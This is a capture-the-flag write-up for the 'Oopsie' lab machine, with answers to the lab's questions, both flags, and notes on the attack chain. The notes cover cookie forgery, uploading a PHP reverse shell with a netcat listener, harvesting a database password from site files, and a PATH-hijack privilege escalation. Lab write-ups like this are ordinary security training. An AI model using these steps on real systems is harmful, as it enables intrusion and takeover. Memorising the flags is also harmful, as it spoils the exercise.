# Oopsie

> Task 1 -  With what kind of tool can intercept web traffic? 

```
proxy
```

> Task 2 -  What is the path to the directory on the webserver that returns a login page? 

```
/cdn-cgi/login
```

> Task 3 -  What can be modified in Firefox to get access to the upload page?

```
cookie
```

> Task 4 -  What is the access ID of the admin user? 

```
34322
```

> Task 5 -  On uploading a file, what directory does that file appear in on the server? 

```
/uploads
```

> Task 6 -  What is the file that contains the password that is shared with the robert user? 

```
db.php
```

> Task 7 - What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?

```
find
```

> Task 8 - Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?

```
root
```

> Task 9 -  What SUID stands for?

```
set owner user id
```

> Task 10 -  What is the name of the executable being called in an insecure manner?

```
cat
```

> Submit user flag

```
f2c74ee8db7983851ab2a96a44eb7981
```

> Submit root flag

```
browser
  proxy in burp to get /cgi/bin page
  http://$IP/cdn-cgi/login/admin.php?content=accounts&id=1 - gives admin
  modify cookie
    role - admin
    user - 34322
  upload rev-shell.php
gobuster to find the dirs - 
  ./gobuster dir --url http://${IP}/ --wordlist ../SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
reverse shell
  nc -nvlp 9999
  browser - http://$IP/uploads/rev-shell.php 
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  ctrl-z and stty raw -echo && fg

www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i password
cat /etc/passwd | grep 'sh$'
  root:x:0:0:root:/root:/bin/bash
  robert:x:1000:1000:robert:/home/robert:/bin/bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep robert
  $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
su - robert -> user.txt
robert@oopsie:~$ id
  uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
find / -group bugtracker 2>/dev/null --> /usr/bin/bugtracker
file /usr/bin/bugtracker
ls -lart /usr/bin/bugtracker
create /tmp/cat, chmod +x cat, append to path then run /usr/bin/bugtracker from /tmp, as root then less root.txt
```

```
af13b0bee69f8a877c3faf667f7beacf
```

